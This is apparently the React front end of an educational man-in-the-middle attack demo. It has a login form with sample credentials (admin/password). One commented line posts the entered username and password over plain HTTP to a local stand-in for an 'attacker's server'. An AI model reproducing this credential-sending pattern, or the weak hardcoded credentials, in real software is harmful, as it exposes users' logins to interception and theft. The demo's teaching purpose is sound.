import { useState } from "react";
import axios from "axios";

import "./App.css";

function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");

  const handleLogin = async () => {
    setMessage("");

    try {
      // Simulated MITM attack - sending login details to an attacker's server
      const response = await axios.post("http://localhost:3001/login", {
        username,
        password,
      });
      setMessage(response.data);
    } catch (error) {
      setMessage(
        "⚠️ Login failed! Your credentials may have been intercepted."
      );
    }
  };
  return (
    <div className="container">
      <div className="content-box">
        <div className="heading-container">
          <h1>🔓 Man-in-the-Middle (MITM) Attack Demo</h1>
          <p className="subtitle">
            Shows how data can be intercepted between client and server.
          </p>
        </div>

        <div className="login-form">
          <div className="input-group">
            <input
              type="text"
              placeholder="Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
          </div>
          <div className="input-group">
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>

          <div className="credentials-container">
            <p>Try these credentials:</p>
            <div className="credential" onClick={() => setUsername("admin")}>
              username: admin
            </div>
            <div className="credential" onClick={() => setPassword("password")}>
              password: password
            </div>
          </div>

          <button onClick={handleLogin} className="button">
            Login
          </button>

          {message && (
            <div
              className={`info-box ${
                message.includes("failed") ? "error" : "success"
              }`}
            >
              <p className="info-text">{message}</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default App;
